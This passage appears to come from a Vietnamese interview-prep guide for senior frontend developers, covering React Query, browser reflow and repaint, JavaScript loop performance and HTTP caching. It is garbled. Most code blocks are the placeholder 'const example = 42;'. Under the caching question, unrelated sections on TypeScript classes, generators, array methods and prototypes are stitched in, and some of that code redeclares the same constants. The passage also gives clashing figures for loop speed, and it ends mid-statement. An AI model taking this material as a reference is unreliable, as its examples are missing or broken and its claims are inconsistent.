- **Cập nhật lạc quan**: Cập nhật giao diện trước, rollback nếu API thất bại.
- **Cuộn vô hạn**: `useInfiniteQuery()` với `getNextPageParam`.
- **Prefetching**: `queryClient.prefetchQuery()` trước khi chuyển trang.

**⚠️ Lỗi Thường Gặp:**
- Nhầm lẫn `staleTime` với `gcTime` (staleTime = độ tươi, gcTime = thời gian giữ cache).
- Quên dependencies trong `queryKey` → không lấy lại khi params thay đổi.
- Lạm dụng trạng thái loading → dùng `isLoading` vs `isPending` đúng ngữ cảnh.
- Không xử lý trạng thái lỗi → thiếu error boundaries.

**💡 Kiến Thức Senior:**
- **Hiệu năng**: React Query gộp requests → nhiều components cùng query chỉ gọi API 1 lần.
- **DevTools**: Dùng React Query DevTools để debug trạng thái cache, thời gian stale, trạng thái query.
- **SSR**: Kết hợp với `HydrationBoundary` + `prefetchQuery` trên server.
- **Chuyển đổi**: Thay thế Redux/SWR dần dần → migrate từng tính năng, không làm cùng lúc.

---
---

## 35. Q35: 🎨 Q18: Browser Rendering (Paint, Repaint, Reflow)

### P1: Tên câu hỏi: 🎨 Q18: Browser Rendering (Paint, Repaint, Reflow)

### P2: Trả lời (Senior):

## 36. Q36: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (1-2 phút):**

**"Reflow (tính toán lại bố cục) tốn kém hơn Repaint (vẽ lại). Tối ưu bằng cách gộp thay đổi DOM, dùng transform/opacity.**

**🎨 Quy Trình Render (Đường Ống Render Quan Trọng):**
1. **Xây Dựng DOM**: Phân tích HTML → cây DOM.
2. **Xây Dựng CSSOM**: Phân tích CSS → cây CSSOM.
3. **Cây Render**: Kết hợp DOM + CSSOM → chỉ các phần tử hiển thị.
4. **Layout (Reflow)**: Tính toán kích thước/vị trí của mỗi phần tử.
5. **Paint (Vẽ)**: Vẽ pixels (màu sắc, hình ảnh, viền, bóng).
6. **Composite (Tổng hợp)**: Kết hợp các lớp → màn hình cuối cùng.

**🔑 Paint vs Repaint vs Reflow:**

| Thao Tác | Kích Hoạt | Chi Phí | Ví Dụ |
|----------|-----------|---------|-------|
| **Paint** | Render lần đầu | Trung bình | Tải trang lần đầu |
| **Repaint** | Thay đổi hình ảnh (không layout) | Thấp | `color`, `background`, `visibility` |
| **Reflow** | Thay đổi bố cục | **Cao** | `width`, `height`, `margin`, `padding`, `display` |

**⚡ Kích Hoạt Reflow (Tốn Kém!):**
- Thao tác DOM: Thêm/xóa phần tử, thay đổi nội dung.
- Thay đổi CSS: `width`, `height`, `margin`, `padding`, `border`, `display`, `position`.
- Đọc thuộc tính layout: `offsetWidth`, `offsetHeight`, `clientWidth`, `scrollTop` → buộc reflow đồng bộ!
- Thay đổi kích thước cửa sổ, thay đổi font, thay đổi class.

**♻️ Kích Hoạt Repaint (Rẻ Hơn):**
- Thuộc tính hình ảnh: `color`, `background-color`, `visibility`, `outline`, `box-shadow`.
- Không thay đổi layout → chỉ vẽ lại pixels.

**🚀 Kỹ Thuật Tối Ưu:**
1. **Gộp Thay Đổi DOM**:

```js
// Ví dụ rút gọn
const example = 42;
```

2. **Dùng transform/opacity (Chỉ Composite):**

```js
// Ví dụ rút gọn
const example = 42;
```

3. **Tránh Đọc Thuộc Tính Layout Trong Vòng Lặp**:

```js
// Ví dụ rút gọn
const example = 42;
```

4. **requestAnimationFrame Cho Animation:**

```js
// Ví dụ rút gọn
const example = 42;
```

5. **Virtualize Long Lists**: Chỉ render visible items (react-window, react-virtualized).

**⚠️ Common Mistakes:**
- Changing styles trong loop → multiple reflows.
- Reading layout properties (offsetWidth) sau write → force synchronous reflow.
- Animating `width/height/top/left` thay vì `transform`.

**💡 Senior Insights:**
- **Composite Layers**: `transform`, `opacity` run on compositor thread (GPU) → không block main thread.
- **will-change**: `will-change: transform` hint browser tạo separate layer → optimize animations.
- **Layout Thrashing**: Read → Write → Read → Write pattern → force multiple reflows. Dùng FastDOM library.
- **DevTools**: Chrome DevTools → Performance tab → see reflow/repaint events.
- **CSS Containment**: `contain: layout` isolate element → reflow không spread to parent.

---

**⚡ Quick Summary:**
> Reflow = recalculate layout (expensive). Repaint = redraw pixels. Paint = first render

**💡 Ghi Nhớ:**
- 🎨 **Paint**: First render lên screen
- 🔄 **Reflow**: Recalculate layout (DOM thay đổi size/position)
- 🖌️ **Repaint**: Redraw pixels (color, visibility change)
- ⚡ **Optimize**: Batch DOM changes, use transform/opacity, requestAnimationFrame

**Trả lời:**

- **Paint**: Vẽ pixels lên screen
- **Repaint**: Vẽ lại elements với same layout
- **Reflow**: Recalculate layout và repaint
- **Hoạt động**: Reflow → Repaint → Composite
- **Ưu điểm**: Optimized rendering, smooth animations
- **Nhược điểm**: Reflow expensive, có thể gây performance issues

**Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Best Practices:**

- Tránh reflow khi có thể
- Sử dụng transform cho animations
- Sử dụng requestAnimationFrame
- Batch DOM changes
---

## 37. Q37: 🔁 Q19: Loop Performance & Async Loops

### P1: Tên câu hỏi: 🔁 Q19: Loop Performance & Async Loops

### P2: Trả lời (Senior):

## 38. Q38: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"Loop performance: `for` nhanh nhất, `for...of` readable, `forEach/map` functional. Async loops: `Promise.all()` parallel, `for await...of` sequential."**

**🔑 Performance Ranking:**

**1. Classic `for` loop (nhanh nhất):**
- **O(n) với minimal overhead** - trực tiếp access index
- Support `break`, `continue`
- Use case: performance-critical, large arrays (>10k items)

**2. `for...of` (modern, readable):**
- Chậm hơn `for` ~10-30% (iterator protocol overhead)
- **Cleanest syntax**, support break/continue
- Use case: code readability > performance, iterate Set/Map/String

**3. `forEach` (functional):**
- Chậm hơn ~50% (function call overhead mỗi iteration)
- **KHÔNG support break/continue**, không thể return early
- Use case: side effects, functional programming style

**4. `map/filter/reduce` (transformation):**
- **Tạo array mới** + function overhead
- Phải loop hết array (không early exit)
- Use case: data transformation, immutable operations

**5. `for...in` (chậm nhất):**
- **KHÔNG dùng cho arrays** - iterate prototype chain
- Use case: chỉ dùng cho object keys

**🔑 Async Loops - 3 Patterns:**

**1. Sequential (chờ từng cái):**

```js
// Ví dụ rút gọn
const example = 42;
```

- Chậm nhưng **controlled**, preserve order

**2. Parallel (chạy cùng lúc):**

```js
// Ví dụ rút gọn
const example = 42;
```

- **Nhanh nhất** nhưng không control order, có thể overload server

**3. Batched (nhóm nhỏ):**

```js
// Ví dụ rút gọn
const example = 42;
```

- **Best practice** - balance speed vs resource usage

**⚠️ Lỗi Thường Gặp:**
- Dùng `forEach` với `async/await` → **KHÔNG chờ** (promises ignored!)
- `Promise.all()` với large arrays → overload server/memory
- Dùng `for...in` cho arrays → iterate cả prototype properties
- `map()` cho side effects (should use `forEach`)

**💡 Kiến Thức Senior:**
- **Early exit**: `for`/`for...of` dùng `break`, functional methods dùng `.some()` / `.every()`
- **Promise.allSettled()** thay Promise.all() để **không fail hết** khi 1 promise reject
- **p-limit** library để control concurrency (max 5 parallel requests)
- Performance: `while` nhanh như `for`, `do...while` cho at-least-once loops

**⚡ Quick Summary:**
> for loop = fastest. forEach = readable. map/filter = functional. Async loops = Promise.all hoặc for await

**💡 Ghi Nhớ:**
- ⚡ **Performance**: for > for...of > forEach > map
- 🔄 **Async**: Dùng `for await...of` hoặc `Promise.all()`
- ⚠️ **Trap**: forEach không work với async/await!

**Trả lời:**

Có nhiều cách để loop qua array/object trong JavaScript, mỗi cách có performance và behavior khác nhau:

**🔄 Các loại Loops & Performance:**

1. **`for` loop** - Nhanh nhất ⚡

- Performance: ⭐⭐⭐⭐⭐ (fastest)
- Control: Full control (break, continue)
- Use case: Performance-critical code, large arrays

2. **`for...of`** - Modern, readable 📖

- Performance: ⭐⭐⭐⭐ (slower than for, faster than forEach)
- Control: Support break, continue
- Use case: Readable code, iterables (Array, Set, Map, String)

3. **`forEach`** - Functional style 🎨

- Performance: ⭐⭐⭐ (slowest - function call overhead)
- Control: KHÔNG support break, continue
- Use case: Functional programming, side effects

4. **`for...in`** - Cho objects 🔑

- Performance: ⭐⭐ (slow - prototype chain lookup)
- Control: Support break, continue
- Use case: Iterate object keys (KHÔNG nên dùng cho arrays)

5. **`map/filter/reduce`** - Functional transformations 🔄
- Performance: ⭐⭐⭐ (similar to forEach)
- Control: KHÔNG support break (phải loop hết array)
- Use case: Transform data, create new arrays

**⚠️ QUAN TRỌNG: Async/Await trong Loops**

**Sequential vs Parallel execution:**

- **Sequential**: Chờ từng promise xong mới chạy tiếp (slow but controlled)
- **Parallel**: Chạy tất cả promises cùng lúc (fast but less control)

**Hoạt động:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Ưu điểm:**

- ✅ **for loop**: Nhanh nhất, full control (break/continue), cache length
- ✅ **for...of**: Modern, readable, support break/continue, work với iterables
- ✅ **forEach**: Functional style, chain methods, readable
- ✅ **Async for...of**: Sequential execution, dễ control
- ✅ **Promise.all**: Parallel execution, nhanh nhất cho async

**Nhược điểm:**

- ❌ **for loop**: Verbose, dễ lỗi (index out of bounds)
- ❌ **for...of**: Chậm hơn for loop ~2-3x
- ❌ **forEach**: Chậm nhất, KHÔNG support break/continue, KHÔNG support async/await
- ❌ **for...in**: RẤT chậm, iterate prototype chain, KHÔNG nên dùng cho arrays
- ❌ **Async sequential**: Chậm (chờ từng promise), không tận dụng concurrency

**Chú thích:**

**🔄 Loop Control Keywords:**

- **`break`**: Thoát loop ngay lập tức
- **`continue`**: Skip iteration hiện tại, tiếp tục iteration tiếp theo
- **`return`**: Thoát function (KHÔNG chỉ loop)

**⚡ Performance Tips:**

- Cache array length: `const len = arr.length` → tránh re-calculate mỗi iteration
- Avoid nested loops: O(n²) → rất chậm với large arrays
- Use `for` loop cho performance-critical code (>10K items)
- Use `for...of` cho readable code (trade-off: ~2-3x slower)

**🔁 Async/Await Behavior:**

- `for`/`for...of`: Support `await` → **sequential** execution
- `forEach`: KHÔNG support `await` đúng cách → callbacks chạy **parallel** nhưng không đợi
- `map` + `Promise.all`: Best practice cho **parallel** async operations
- `for await...of`: Dành cho **async iterables** (streams, generators)

**Code Example (TypeScript):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**Best Practices:**

1. **Chọn Loop Type đúng Use Case**

```js
// Ví dụ rút gọn
const example = 42;
```

2. **Cache Array Length**

```js
// Ví dụ rút gọn
const example = 42;
```

3. **Async/Await đúng cách**

```js
// Ví dụ rút gọn
const example = 42;
```

4. **Avoid Nested Loops (O(n²))**

```js
// Ví dụ rút gọn
const example = 42;
```

5. **Error Handling trong Async Loops**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**Common Mistakes:**

1. **❌ forEach với async/await**

```js
// Ví dụ rút gọn
const example = 42;
```

2. **❌ for...in với Arrays**

```js
// Ví dụ rút gọn
const example = 42;
```

3. **❌ Không Cache Length**

```js
// Ví dụ rút gọn
const example = 42;
```

4. **❌ Nested Loops O(n²)**

```js
// Ví dụ rút gọn
const example = 42;
```

5. **❌ Promise.all mà không handle errors**

```js
// Ví dụ rút gọn
const example = 42;
```

---
---

## 39. Q39: 💾 Q20: Handle Caching - HTTP Caching & Browser Cache Strategies

### P1: Tên câu hỏi: 💾 Q20: Handle Caching - HTTP Caching & Browser Cache Strategies

### P2: Trả lời (Senior):

## 40. Q40: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"HTTP caching = giảm yêu cầu server bằng Cache-Control, ETag. Service Worker = hỗ trợ offline.**

**📦 Loại Cache & Phân Cấp:**
1. **Memory Cache**: Trong bộ nhớ RAM → nhanh nhất, xóa khi đóng tab.
2. **Disk Cache**: Trên ổ đĩa → duy trì qua các phiên.
3. **Service Worker Cache**: API cache theo chương trình → hỗ trợ offline, chiến lược tùy chỉnh.
4. **HTTP Cache**: Cache trình duyệt theo Cache-Control headers.
5. **CDN Cache**: Servers biên cache tài nguyên tĩnh toàn cầu.

**🔑 HTTP Cache Headers (Bắt Buộc Biết):**

| Header | Mục Đích | Ví Dụ |
|--------|----------|--------|
| **Cache-Control** | Chỉ thị cache chính | `max-age=3600, public` |
| **ETag** | Token xác thực | `"abc123"` (hash phiên bản) |
| **Last-Modified** | Thời gian cập nhật cuối | `Thu, 01 Jan 2024 00:00:00 GMT` |
| **Expires** | Ngày hết hạn (cũ) | `Thu, 01 Jan 2025 00:00:00 GMT` |
| **Vary** | Thay đổi cache theo header | `Vary: Accept-Encoding` |

**🔧 Chỉ Thị Cache-Control:**
- **`max-age=3600`**: Cache 1 giờ (3600 giây).
- **`public`**: Cache được bởi trình duyệt + CDN.
- **`private`**: Chỉ cache bởi trình duyệt (không CDN) → dữ liệu cá nhân.
- **`no-cache`**: Phải xác thực lại với server (304 Not Modified nếu không thay đổi).
- **`no-store`**: Không cache (dữ liệu nhạy cảm: mật khẩu, thẻ tín dụng).
- **`immutable`**: Tài nguyên không bao giờ thay đổi → không xác thực lại (tài nguyên tĩnh có hash).

**♻️ Chiến Lược Cache (Service Worker):**

1. **Cache First (Tài nguyên tĩnh)**:
- Kiểm tra cache → nếu có trả về → nếu không lấy từ mạng.
- ✅ Dùng cho: Fonts, hình ảnh, CSS, JS có tên file phiên bản.

2. **Network First (Dữ liệu động)**:
- Lấy từ mạng → nếu thất bại trả về cache.
- ✅ Dùng cho: Dữ liệu API, nội dung người dùng.

3. **Stale While Revalidate**:
- Trả về cache ngay (nhanh) + lấy mạng background → cập nhật cache.
- ✅ Dùng cho: Cân bằng tốc độ + độ mới (nguồn tin, mạng xã hội).

4. **Network Only**:
- Luôn lấy từ mạng → không cache.
- ✅ Dùng cho: Phân tích, dữ liệu thời gian thực.

5. **Cache Only**:
- Chỉ dùng cache → ưu tiên offline.
- ✅ Dùng cho: Vỏ ứng dụng PWA.

**🔍 ETag & Conditional Requests:**
- **ETag**: Hash của resource content → version identifier.
- **Flow**:
  1. Server response: `ETag: "abc123"`.
  2. Browser cache + store ETag.
  3. Next request: `If-None-Match: "abc123"`.
  4. Server check: Unchanged → `304 Not Modified` (no body) | Changed → `200 OK` (new content + new ETag).
- **Benefit**: Save bandwidth (304 response nhỏ hơn full response).

**⚠️ Common Pitfalls:**
- **Cache Busting**: Static assets thay đổi nhưng cùng filename → browser serve stale cache.
- **Solution**: Hash trong filename (`app.abc123.js`) hoặc query param (`app.js?v=123`).
- **Over-caching**: Cache sensitive data (passwords) → security risk. Dùng `no-store`.
- **Under-caching**: Không cache static assets → waste bandwidth, slow load.
- **CDN cache**: Purge CDN cache khi deploy new version.

**💡 Senior Insights:**
- **Versioning Strategy**: Dùng content hash cho static assets (`webpack`/`vite` auto generate).
- **Immutable Resources**: Set `Cache-Control: max-age=31536000, immutable` cho versioned assets → never revalidate.
- **Service Worker**: Combine strategies (cache shell với Cache First, API với Network First).
- **Performance**: Cache reduce TTFB (Time To First Byte), improve Core Web Vitals (LCP, FCP).
- **DevTools**: Chrome DevTools → Network tab → check cache status (from disk cache, from memory cache).
- **Cache-Control vs Expires**: `Cache-Control` modern, `Expires` legacy. Nếu both, `Cache-Control` wins.

**🚀 Best Practices:**
1. **Static assets**: Long max-age (1 year) + immutable + hash filenames.
2. **HTML**: `no-cache` → always revalidate (ETag/Last-Modified).
3. **API**: Short max-age (5 minutes) hoặc `no-cache` + ETag.
4. **User-specific data**: `private` (not `public`).
5. **Sensitive data**: `no-store`.

---

**⚡ Quick Summary:**
> HTTP Cache = Cache-Control, ETag. Browser Cache = disk/memory cache. Service Worker = offline cache

**💡 Ghi Nhớ:**
- 📦 **Cache-Control**: max-age, no-cache, no-store
- 🏷️ **ETag**: Validation token cho conditional requests
- 💾 **Storage**: localStorage (persist), sessionStorage (tab), Cache API (PWA)

**Trả lời:**

- **HTTP Caching**: Cơ chế lưu trữ responses để tránh tải lại resources, giảm latency và bandwidth
- **Cache Types**: Browser Cache, Service Worker Cache, Memory Cache, Disk Cache, CDN Cache
- **Cache Headers**: Cache-Control, ETag, Last-Modified, Expires, Vary
- **🔥 Ưu điểm**: Tăng tốc độ load page, giảm server load, tiết kiệm bandwidth, cải thiện UX
- **⚠️ Nhược điểm**: Có thể serve stale data, phức tạp khi manage cache invalidation, storage limitations

**🎯 HTTP Cache Headers & Directives:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// RHF dùng Proxy để:
1. **Theo dõi đăng ký field**: bẫy get → tự động đăng ký field khi truy cập.
2. **Validate khi thay đổi**: bẫy set → kích hoạt validation khi setValue.
3. **Theo dõi trạng thái dirty**: So sánh proxy state với giá trị mặc định.
4. **Hỗ trợ object lồng nhau**: Proxy đệ quy cho nested fields.
5. **Hiệu năng**: Chỉ render lại fields bị thay đổi (reactivity chi tiết).

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Basic class
class Person {
  name: string;
  age: number;

  constructor(name: string, age: number) {
    this.name = name;
    this.age = age;
  }

  greet(): string {
    return `Hello, I'm ${this.name}`;
  }

  getAge(): number {
    return this.age;
  }
}

const person = new Person('John', 25);
console.log(person.greet()); // Chú giải: "Hello, I'm John"

 // Chú giải: Inheritance
class Student extends Person {
  grade: string;

  constructor(name: string, age: number, grade: string) {
    super(name, age);
    this.grade = grade;
  }

  study(): string {
    return `${this.name} is studying`;
  }

  greet(): string {
    return `Hello, I'm ${this.name} and I'm a student`;
  }
}

const student = new Student('Jane', 20, 'A');
console.log(student.greet()); // Chú giải: "Hello, I'm Jane and I'm a student"

 // Chú giải: Static methods
class MathUtils {
  static add(a: number, b: number): number {
    return a + b;
  }

  static multiply(a: number, b: number): number {
    return a * b;
  }
}

console.log(MathUtils.add(5, 3)); // Chú giải: 8

 // Chú giải: Getters and setters
class Circle {
  private _radius: number;

  constructor(radius: number) {
    this._radius = radius;
  }

  get radius(): number {
    return this._radius;
  }

  set radius(value: number) {
    if (value < 0) {
      throw new Error('Radius cannot be negative');
    }
    this._radius = value;
  }

  get area(): number {
    return Math.PI * this._radius * this._radius;
  }
}

const circle = new Circle(5);
console.log(circle.area); // Chú giải: 78.54
circle.radius = 10;
console.log(circle.area); // Chú giải: 314.16

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Basic Generator Function
function* numberGenerator(): Generator<number, void, unknown> {
  yield 1;
  yield 2;
  yield 3;
  return 4; // Chú giải: Final value
}

const gen = numberGenerator();
console.log(gen.next()); // Chú giải: { value: 1, done: false }
console.log(gen.next()); // Chú giải: { value: 2, done: false }
console.log(gen.next()); // Chú giải: { value: 3, done: false }
console.log(gen.next()); // Chú giải: { value: 4, done: true }

 // Chú giải: Generator với parameters
function* counter(
  start: number,
  end: number
): Generator<number, void, unknown> {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}

const counterGen = counter(1, 5);
for (const value of counterGen) {
  console.log(value); // Chú giải: 1, 2, 3, 4, 5
}

 // Chú giải: yield* - Delegate to another generator
function* generator1(): Generator<number, void, unknown> {
  yield 1;
  yield 2;
}

function* generator2(): Generator<number, void, unknown> {
  yield 3;
  yield 4;
}

function* combinedGenerator(): Generator<number, void, unknown> {
  yield* generator1();
  yield* generator2();
  yield 5;
}

const combined = combinedGenerator();
console.log([...combined]); // Chú giải: [1, 2, 3, 4, 5]

 // Chú giải: Generator với input values
function* inputGenerator(): Generator<number, void, number> {
  let value = yield 1;
  console.log('Received:', value);
  value = yield 2;
  console.log('Received:', value);
  return value;
}

const inputGen = inputGenerator();
console.log(inputGen.next()); // Chú giải: { value: 1, done: false }
console.log(inputGen.next(10)); // Chú giải: Received: 10, { value: 2, done: false }
console.log(inputGen.next(20)); // Chú giải: Received: 20, { value: 20, done: true }

 // Chú giải: Async Generator
async function* asyncNumberGenerator(): AsyncGenerator<number, void, unknown> {
  yield 1;
  await new Promise((resolve) => setTimeout(resolve, 1000));
  yield 2;
  await new Promise((resolve) => setTimeout(resolve, 1000));
  yield 3;
}

async function consumeAsyncGenerator(): Promise<void> {
  for await (const value of asyncNumberGenerator()) {
    console.log('Async value:', value);
  }
}

consumeAsyncGenerator(); // Chú giải: Logs: Async value: 1, then 2, then 3

 // Chú giải: Practical example: Data streaming
async function* dataStream(): AsyncGenerator<string, void, unknown> {
  const data = ['chunk1', 'chunk2', 'chunk3'];
  for (const chunk of data) {
    await new Promise((resolve) => setTimeout(resolve, 500));
    yield chunk;
  }
}

async function processStream(): Promise<void> {
  for await (const chunk of dataStream()) {
    console.log('Processing chunk:', chunk);
  }
}

processStream();

 // Chú giải: Generator for infinite sequences
function* fibonacci(): Generator<number, void, unknown> {
  let a = 0,
    b = 1;
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();
console.log(fib.next().value); // Chú giải: 0
console.log(fib.next().value); // Chú giải: 1
console.log(fib.next().value); // Chú giải: 1
console.log(fib.next().value); // Chú giải: 2
console.log(fib.next().value); // Chú giải: 3

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ Sai: Không hiểu generator state
const gen = numberGenerator();
console.log(gen.next()); // Chú giải: { value: 1, done: false }
console.log(gen.next()); // Chú giải: { value: 2, done: false }
 // Chú giải: Generator state is maintained

// ✅ Đúng: Hiểu generator state
const gen = numberGenerator();
const values = [...gen]; // Chú giải: [1, 2, 3]
 // Chú giải: Generator is exhausted after iteration

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Array.flat() - Flatten nested arrays
const nestedArray = [1, [2, 3], [4, [5, 6]]];
const flattened = nestedArray.flat(); // Chú giải: [1, 2, 3, 4, [5, 6]]
const deeplyFlattened = nestedArray.flat(2); // Chú giải: [1, 2, 3, 4, 5, 6]

// Array.flatMap() - Map và flatten
const numbers = [1, 2, 3, 4];
const doubled = numbers.flatMap((n) => [n, n * 2]); // Chú giải: [1, 2, 2, 4, 3, 6, 4, 8]

 // Chú giải: Array.from() - Create array from iterable
const arrayFromString = Array.from('hello'); // Chú giải: ['h', 'e', 'l', 'l', 'o']
const arrayFromSet = Array.from(new Set([1, 2, 2, 3])); // Chú giải: [1, 2, 3]
const arrayWithMapping = Array.from({ length: 5 }, (_, i) => i * 2); // Chú giải: [0, 2, 4, 6, 8]

 // Chú giải: Array.of() - Create array from arguments
const arrayOf = Array.of(1, 2, 3, 4); // Chú giải: [1, 2, 3, 4]
const arrayOfSingle = Array.of(7); // Chú giải: [7]

 // Chú giải: Array.entries() - Get index-value pairs
const fruits = ['apple', 'banana', 'orange'];
for (const [index, fruit] of fruits.entries()) {
  console.log(`${index}: ${fruit}`);
}

 // Chú giải: Array.values() - Get values
const values = fruits.values();
for (const value of values) {
  console.log(value);
}

 // Chú giải: Array.keys() - Get indices
const keys = fruits.keys();
for (const key of keys) {
  console.log(key);
}

 // Chú giải: Object.assign() - Copy properties
const target = { a: 1, b: 2 };
const source = { b: 3, c: 4 };
const result = Object.assign(target, source); // Chú giải: { a: 1, b: 3, c: 4 }

 // Chú giải: Object.entries() - Get key-value pairs
const person = { name: 'John', age: 30, city: 'HCM' };
const entries = Object.entries(person); // Chú giải: [['name', 'John'], ['age', 30], ['city', 'HCM']]

 // Chú giải: Object.values() - Get values
const values = Object.values(person); // Chú giải: ['John', 30, 'HCM']

 // Chú giải: Object.keys() - Get keys
const keys = Object.keys(person); // Chú giải: ['name', 'age', 'city']

 // Chú giải: Practical examples
function processUserData(users: any[]): any[] {
  return users
    .flatMap((user) => user.hobbies || []) // Chú giải: Flatten hobbies
    .filter((hobby) => hobby.length > 3) // Chú giải: Filter long hobbies
    .map((hobby) => hobby.toUpperCase()); // Chú giải: Transform
}

function createLookupTable(objects: any[]): Map<string, any> {
  return new Map(
    objects.flatMap((obj) =>
      Object.entries(obj).map(([key, value]) => [key, obj])
    )
  );
}

function mergeObjects(...objects: any[]): any {
  return objects.reduce((acc, obj) => Object.assign(acc, obj), {});
}

function getObjectStats(obj: any): {
  keys: number;
  values: any[];
  entries: [string, any][];
} {
  return {
    keys: Object.keys(obj).length,
    values: Object.values(obj),
    entries: Object.entries(obj),
  };
}

 // Chú giải: Advanced usage
function transformData(data: any[]): any[] {
  return data
    .flatMap((item) => item.items || []) // Chú giải: Flatten nested items
    .map((item) => ({
      ...item,
      processed: true,
      timestamp: Date.now(),
    }))
    .filter((item) => item.active);
}

function createIndexMap(data: any[]): Map<string, any[]> {
  const indexMap = new Map();

  data.forEach((item) => {
    Object.entries(item).forEach(([key, value]) => {
      if (!indexMap.has(key)) {
        indexMap.set(key, []);
      }
      indexMap.get(key).push(value);
    });
  });

  return indexMap;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ Sai: Không hiểu flat depth
const nested = [1, [2, [3, [4]]]];
const flattened = nested.flat(); // Chú giải: [1, 2, [3, [4]]] - only 1 level

// ✅ Đúng: Specify depth
const deeplyFlattened = nested.flat(Infinity); // Chú giải: [1, 2, 3, 4]

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Nguyên mẫu (prototype): cơ chế kế thừa theo chuỗi trong JS; `class` chỉ là cú pháp sugar trên prototype.
const personPrototype = {
  greet(): string {
    return `Hello, I'm ${this.name}`;
  },
  getAge(): number {
    return this.age;
  },
};

const person = Object.create(personPrototype);
person.name = 'John';
person.age = 30;

console.log(person.greet()); // Chú giải: "Hello, I'm John"
console.log(person.getAge()); // Chú giải: 30

 // Nguyên mẫu (prototype): cơ chế kế thừa theo chuỗi trong JS; `class` chỉ là cú pháp sugar trên prototype.
function Person(name: string, age: number) {
  this.name = name;
  this.age = age;
}

Person.prototype.greet = function (): string {
  return `Hello, I'm ${this.name}`;
};

function Student(name: string, age: number, grade: string) {
  Person.call(this, name, age);
  this.grade = grade;
}

 // Chú giải: Set up inheritance
Student.prototype = Object.create(Person.prototype);
Student.prototype.constructor = Student;

Student.prototype.study = function (): string {
  return `${this.name} is studying`;
};

const student = new Student('Jane', 20, 'A');
console.log(student.greet()); // Chú giải: "Hello, I'm Jane"
console.log(student.study()); // Chú giải: "Jane is studying"

 // Chú giải: Mixin pattern
const canFly = {
  fly(): string {
    return `${this.name} is flying`;
  },
};

const canSwim = {
  swim(): string {
    return `${this.name} is swimming`;
  },
};

function mixin(target: any, ...sources: any[]): any {
  sources.forEach((source) => {
    Object.getOwnPropertyNames(source).forEach((name) => {
      if (name !== 'constructor') {
        target[name] = source[name];
      }
    });
  });
  return target;
}

function Bird(name: string) {
  this.name = name;
}

mixin(Bird.prototype, canFly);

const bird = new Bird('Eagle');
console.log(bird.fly()); // Chú giải: "Eagle is flying"

 // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến. Bất biến: giá trị không thay đổi sau khi tạo; thường dùng để tránh side-effect và dễ reasoning.
const frozenObject = Object.freeze({
  name: 'John',
  age: 30,
  address: {
    city: 'HCM',
  },
});

 // Chú giải: frozenObject.name = 'Jane'; // Error in strict mode
 // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.

 // Sao chép sâu: sao chép đệ quy mọi cấp để tạo bản sao độc lập; có thể tốn hiệu suất.
function deepFreeze(obj: any): any {
  Object.getOwnPropertyNames(obj).forEach((prop) => {
    if (obj[prop] !== null && typeof obj[prop] === 'object') {
      deepFreeze(obj[prop]);
    }
  });
  return Object.freeze(obj);
}

const deeplyFrozen = deepFreeze({
  name: 'John',
  address: {
    city: 'HCM',
  },
});

 // Chú giải: Object.seal() - Prevent adding/removing properties
const sealedObject = Object.seal({
  name: 'John',
  age: 30,
});

 // Chú giải: sealedObject.name = 'Jane'; // OK
 // Chú giải: sealedObject.city = 'HCM'; // Error in strict mode
 // Chú giải: delete sealedObject.age; // Error in strict mode

 // Chú giải: Object.preventExtensions() - Prevent adding properties
const nonExtensibleObject = Object.preventExtensions({
  name: 'John',
  age: 30,
});

 // Chú giải: nonExtensibleObject.name = 'Jane'; // OK
 // Chú giải: nonExtensibleObject.city = 'HCM'; // Error in strict mode
 // Chú giải: delete nonExtensibleObject.age; // OK

 // Chú giải: Property descriptors
const obj = { name: 'John' };

Object.defineProperty(obj, 'age', {
  value: 30,
  writable: false,
  enumerable: true,
  configurable: false,
});

 // Chú giải: obj.age = 40; // Error in strict mode
 // Chú giải: delete obj.age; // Error in strict mode

 // Chú giải: Get property descriptor
const descriptor = Object.getOwnPropertyDescriptor(obj, 'age');
console.log(descriptor); // Chú giải: { value: 30, writable: false, enumerable: true, configurable: false }

 // Chú giải: Object.getOwnPropertyNames() vs Object.keys()
const obj = { a: 1, b: 2 };
Object.defineProperty(obj, 'c', {
  value: 3,
  enumerable: false,
});

console.log(Object.keys(obj)); // Chú giải: ['a', 'b']
console.log(Object.getOwnPropertyNames(obj)); // Chú giải: ['a', 'b', 'c']

 // Chú giải: hasOwnProperty vs in operator
const obj = { a: 1 };
console.log(obj.hasOwnProperty('a')); // Chú giải: true
console.log('a' in obj); // Chú giải: true
console.log(obj.hasOwnProperty('toString')); // Chú giải: false
console.log('toString' in obj); // Chú giải: true

 // Chú giải: Practical examples
function createImmutableObject(data: any): any {
  return Object.freeze(
    Object.keys(data).reduce((acc, key) => {
      acc[key] =
        typeof data[key] === 'object' ? deepFreeze(data[key]) : data[key];
      return acc;
    }, {} as any)
  );
}

function createMixin(...mixins: any[]): any {
  return function (target: any): any {
    mixins.forEach((mixin) => {
      Object.getOwnPropertyNames(mixin).forEach((name) => {
        if (name !== 'constructor') {
          target[name] = mixin[name];
        }
      });
    });
    return target;
  };
}

 // Chú giải: Usage
const withLogging = createMixin({
